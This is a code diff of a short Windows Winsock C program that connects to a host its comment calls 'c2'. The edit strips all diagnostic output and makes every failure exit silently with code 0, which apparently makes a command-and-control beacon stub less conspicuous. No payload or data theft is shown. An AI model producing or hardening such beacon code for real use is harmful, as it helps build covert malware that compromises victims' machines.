@@ -1,7 +1,6 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>  // for getaddrinfo
 #include <windows.h>
-#include <stdio.h>
 #pragma comment(lib, "ws2_32.lib")
 
 int main() {
@@ -15,8 +14,7 @@ int main() {
 
     // create winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-        printf("WSAStartup failed.\n");
-        return 1;
+        return 0;
     }
 
     ZeroMemory(&hints, sizeof(hints));
@@ -25,31 +23,26 @@ int main() {
 
     ret = getaddrinfo(domain, port, &hints, &result);
     if (ret != 0) {
-        printf("getaddrinfo failed: %d\n", ret);
         WSACleanup();
-        return 1;
+        return 0;
     }
 
     // create socket
     s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
-    if (s == INVALID_SOCKET) {
-        printf("Socket creation failed: %ld\n", WSAGetLastError());
+    if (s == INVALID_SOCKET) {;
         freeaddrinfo(result);
         WSACleanup();
-        return 1;
+        return 0;
     }
 
     // Connect to c2
     ret = connect(s, result->ai_addr, (int)result->ai_addrlen);
     if (ret == SOCKET_ERROR) {
-        printf("Connect failed: %ld\n", WSAGetLastError());
         closesocket(s);
         freeaddrinfo(result);
         WSACleanup();
-        return 1;
+        return 0;
     }
-
-    printf("Connected to %s:%s\n", domain, port);
 
     freeaddrinfo(result);
     closesocket(s);
